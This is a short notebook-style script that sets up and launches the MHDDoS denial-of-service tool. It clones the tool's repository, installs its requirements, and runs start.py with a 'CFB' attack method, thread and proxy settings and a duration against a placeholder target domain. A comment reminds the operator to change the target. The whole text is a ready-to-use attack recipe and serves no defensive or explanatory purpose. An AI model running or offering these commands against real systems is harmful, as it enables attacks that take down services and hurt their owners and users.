# %%
# !git clone https://github.com/MHProDev/MHDDoS.git dos

# %%
# !mv dos/* . && rm -rf dos

# %%
# !pip3 install --no-cache-dir -r requirements.txt

# %% [markdown]
# [**README**](https://github.com/devillD/MHDDoS#features-and-methods)
#
# `Don't forget to change your tergat domain`

# %%
# !python3 start.py CFB target.domain 0 894 proxy.txt 61 1693
